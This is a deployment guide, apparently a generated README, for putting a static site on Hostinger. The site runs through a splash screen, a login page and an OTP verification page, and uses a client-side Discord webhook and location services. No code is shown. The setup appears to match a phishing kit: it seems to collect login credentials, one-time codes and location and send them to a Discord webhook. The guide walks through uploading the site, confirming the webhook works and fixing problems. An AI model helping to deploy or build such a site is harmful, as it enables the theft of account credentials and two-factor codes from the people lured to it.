# Hostinger Deployment Guide

## ✅ Current Setup
Your project is already configured with `index.html` as the main entry point, which is perfect for Hostinger!

## File Structure
```
/
├── index.html          ← Main entry point (Splash Screen)
├── transition.html     ← Transition screen
├── welcome.html        ← Welcome page with login button
├── login.html          ← Login page
├── otp.html            ← OTP verification page
├── api/
│   └── discord.js      ← Discord webhook handler (for server-side)
├── discord-config.js   ← Discord configuration
├── location-helper.js  ← Location services
└── ... (other files)
```

## Screen Flow
1. **index.html** (Splash) → Shows for 2 seconds
2. **transition.html** → Shows for 2 seconds  
3. **welcome.html** → Main welcome page
4. **login.html** → Login page
5. **otp.html** → OTP verification

## Deployment Steps

### 1. Upload Files to Hostinger
1. Log in to your Hostinger account
2. Go to **File Manager** or use **FTP**
3. Navigate to `public_html` folder (or your domain's root folder)
4. Upload ALL files from your project folder:
   - All HTML files
   - All CSS files
   - All JavaScript files
   - All images (logo.jpg, header-logo.jpg, sky-image.png)
   - The `api` folder (if using server-side Discord handler)

### 2. Discord Webhook Configuration
The Discord webhook is already configured in `discord-config.js`:
- Webhook URL: Already set
- Works client-side (no server needed)

**Note**: If you want to use the server-side handler (`api/discord.js`), you'll need:
- Node.js hosting (not all Hostinger plans support this)
- Or use PHP version (if available)

### 3. Test Your Site
1. Visit your domain: `https://yourdomain.com`
2. It should automatically start with the splash screen (`index.html`)
3. Test the full flow: Splash → Transition → Welcome → Login → OTP

### 4. Important Notes

**For Static Hosting (HTML/CSS/JS only):**
- ✅ Works perfectly on Hostinger
- ✅ Discord webhook works client-side
- ✅ All features should work

**If you need server-side features:**
- Check if your Hostinger plan supports Node.js
- Or use PHP version for Discord webhook (if available)

## Troubleshooting

### Issue: Discord webhook not working
- Check browser console for errors
- Verify Discord webhook URL in `discord-config.js`
- Make sure CORS is not blocking (should work from browser)

### Issue: Files not loading
- Check file paths are correct
- Ensure all files are uploaded to the same directory
- Check file permissions (should be 644 for files, 755 for folders)

### Issue: Images not showing
- Verify image files are uploaded
- Check image paths in HTML/CSS files
- Ensure file names match exactly (case-sensitive on some servers)

## Current Configuration
- ✅ `index.html` is the main entry point
- ✅ All paths are relative (work on any host)
- ✅ Discord webhook configured
- ✅ Location services enabled
- ✅ Ready for Hostinger deployment

Your site is ready to deploy! 🚀

